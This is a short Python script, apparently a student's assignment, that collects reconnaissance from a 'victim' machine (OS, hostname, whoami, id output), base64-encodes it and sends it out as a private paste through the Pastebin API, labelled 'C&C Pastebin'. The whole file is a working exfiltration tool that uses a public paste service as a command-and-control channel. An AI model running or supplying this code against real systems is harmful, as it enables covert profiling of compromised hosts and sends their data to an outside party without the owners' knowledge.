# Eric Kurniawan
# 2301860072

import base64, requests, platform
from subprocess import PIPE, Popen
from requests.api import post

url = 'https://pastebin.com/api/api_post.php'
key = " [PLEASE INPUT YOUR OWN API KEY] "

def encode(message):
    # Encode to base64
    data = base64.b64encode(message.encode('utf-8'))
    print(data)
    return data

def info(data):
    pbData = {
        'api_dev_key': key,
        'api_option': 'paste',
        'api_paste_code': data,
        'api_paste_name': 'C&C Pastebin',
        'api_paste_private': 1
    }

    send = post(url, data=pbData)
    print(f"Status code: {send.status_code}")
    print(f"Pastebin Link : {send.text}")

message = "Recon results\n===========\n"
message += f"Victim's OS: {platform.platform()}\n"

# Check Operating system

if platform.system() == "Windows":
    commands = ["hostname", "whoami"]

else:
    commands = ["hostname", "whoami", "id"]

for command in commands:
    scan = Popen(command, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, err = scan.communicate()

    if result == b"":
        message += err.decode()
    else:
        message += result.decode()

encode(message)
info(encode(message))